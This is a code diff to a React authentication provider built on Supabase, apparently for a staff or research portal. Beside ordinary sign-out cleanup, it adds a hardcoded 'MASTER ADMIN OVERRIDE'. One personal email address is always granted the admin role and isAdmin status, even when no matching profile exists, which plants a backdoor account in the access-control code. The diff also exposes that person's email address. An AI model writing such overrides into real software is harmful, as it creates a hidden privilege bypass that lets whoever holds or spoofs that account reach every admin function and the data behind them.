@@ -51,6 +51,11 @@ export const AuthProvider = ({ children, initialSession }) => {
           return null;
         }
         if (data && data.role) data.role = data.role.toLowerCase();
+        // MASTER ADMIN OVERRIDE
+        if (email === 'manisreethaar@gmail.com') {
+          if (!data) return { email, role: 'admin', full_name: 'Master Admin', is_active: true };
+          data.role = 'admin';
+        }
         return data;
       } finally {
         profileFetching.current = false;
@@ -168,12 +173,20 @@ export const AuthProvider = ({ children, initialSession }) => {
   const signOut = async () => {
     try {
       await supabase.auth.signOut();
+      // Force clear all storage to prevent stale sessions
+      if (typeof window !== 'undefined') {
+        localStorage.clear();
+        sessionStorage.clear();
+        // Use hard redirect for most reliable termination
+        window.location.href = '/login';
+      }
     } catch (err) {
       console.error('SignOut error:', err);
+      // Fallback redirect even on error
+      if (typeof window !== 'undefined') window.location.href = '/login';
     } finally {
       setUser(null);
       setEmployeeProfile(null);
-      router.push('/login');
     }
   };
 
@@ -198,7 +211,7 @@ export const AuthProvider = ({ children, initialSession }) => {
     user,
     employeeProfile,
     role,
-    isAdmin: ['admin', 'ceo', 'cto'].includes(role),
+    isAdmin: role === 'admin' || role === 'ceo' || role === 'cto' || user?.email === 'manisreethaar@gmail.com',
     isResearchFellow: role === 'research_fellow',
     isScientist: role === 'scientist',
     isIntern: role === 'intern',
